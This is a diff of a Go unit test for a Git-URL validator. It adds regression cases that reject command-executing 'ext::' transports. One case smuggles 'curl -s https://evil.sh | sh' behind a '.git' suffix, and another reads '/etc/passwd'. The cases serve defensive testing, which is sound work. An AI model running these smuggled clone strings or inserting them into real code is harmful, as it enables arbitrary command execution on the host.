@@ -24,12 +24,24 @@ func TestIsGitURL(t *testing.T) {
 		{"git://example.com/repo", true},
 		{"ssh://git@example.com/repo.git", true},
 		{"git@github.com:foo/bar.git", true},
-		{"repo.git", true},
 		{"./local/path", false},
 		{"/abs/local/path", false},
 		{"../relative", false},
 		{"some-dir", false},
 		{"", false},
+		// A bare ".git" suffix with NO accepted scheme must NOT be treated as a
+		// clone target: it falls through to the safe local-path branch. This is
+		// what closes the "ext:: transport smuggled behind a .git suffix" hole.
+		{"repo.git", false},
+		// git's command-executing transports must never be admitted, even when
+		// crafted to end in ".git" (the old ".git"-suffix rule let these through,
+		// and "git clone" would then run the payload on the host).
+		{"ext::sh -c 'curl -s https://evil.sh | sh' .git", false},
+		{"ext::sh -c whoami", false},
+		{"file:///etc/passwd", false},
+		{"fd::17/foo.git", false},
+		// A "git@" string with no ":path" separator is not a valid scp-like URL.
+		{"git@github.com", false},
 	}
 	for _, tt := range tests {
 		t.Run(tt.source, func(t *testing.T) {
